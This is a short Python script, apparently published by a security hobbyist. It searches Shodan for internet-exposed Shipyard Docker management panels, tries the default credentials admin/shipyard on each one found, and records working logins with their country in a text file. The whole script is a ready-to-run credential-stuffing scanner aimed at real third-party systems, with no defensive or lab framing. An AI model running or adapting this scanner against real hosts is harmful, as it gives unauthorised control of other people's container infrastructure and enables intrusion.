#
# shipyard.py
# Search SHODAN for shipyard docker management system with default creds
#
# Author: random_robbie

import shodan
import requests
import os
import colorama
import sys
from colorama import init, Fore, Back, Style
init(autoreset=True)

# Configuration
API_KEY = "YOURSHODANKEY"
SEARCH_FOR = 'title:"shipyard" HTTP/1.1 200 OK Accept-Ranges: bytes Content-Length: 5664'

def check_login (IP,PORT,CC):
	session = requests.Session()

	rawBody = '{"username":"admin","password":"shipyard"}'
	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
	response = session.post("http://"+IP+":"+PORT+"/auth/login", data=rawBody, headers=headers)
	
	if 'invalid username' in response.text:
		return False
	
	if response.status_code == 200:
		text_file = open("defaults.txt", "a")
		text_file.write("[*] http://"+IP+":"+PORT+" - Country: "+CC+"\n")
		text_file.close()
		return True
		
		
def test_ip (IP,PORT):
	session = requests.Session()

	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Accept":"*/*"}
	try:
		response = session.get("http://"+IP+":"+PORT+"/", headers=headers)

		if response.status_code == 200:
			return True
		else:
			return False
	except:
			return False


try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit=100)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				print (Fore.YELLOW +"[*] Trying "+IP+" on "+PORT+" Country: "+CC+" [*]")
				test = test_ip (IP,PORT)
				if test == True:
					live = check_login(IP,PORT,CC)
					if live == True:
						print (Fore.GREEN +"[*] Working Login Found [*]")
				if test == False:
					print (Fore.RED +"[*] Login Failed [*]")
				
except Exception as e:
		print (e)
		print('Error: %s' % e)
		sys.exit(1)